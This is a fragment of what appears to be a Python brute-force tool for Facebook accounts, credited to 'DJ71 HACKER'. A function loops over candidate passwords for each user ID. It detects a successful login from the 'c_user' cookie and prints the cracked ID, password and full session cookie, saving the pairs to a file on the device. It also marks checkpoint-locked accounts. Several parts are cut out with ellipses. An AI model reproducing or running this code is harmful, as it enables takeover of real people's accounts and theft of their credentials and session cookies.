...
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                    
 {gn}Owner    : {cn}DJ 71{ed}
 {gn}Guthub   : {cn}IYANUR420{ed}
 {gn}Facebook : {cn}IYANUR420{ed}
 {gn}Taligram : {wn}DJ71 HACKER{ed}
 {gn}Tools    : {cn}RANK{pn} •{gn}[{cn}version \033[1;42m{rn}•DJ.71•{ed}{gn}]{ed}
{yn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ed}''')
# MAIN MANU 
def Main():
        os.system("clear")
...
def jubair(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[DJ71-GAMING]\033[1;36m💔[%s/%s]🌺\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mDJ71 GAMING-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[] COOKIE🌹 :\033[1;95m {coki}")
                open('/sdcard/DJ71 GAMING-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mDJ71 GAMING-CP\033[1;33m]\033[1;91m {uid}|{ps}")
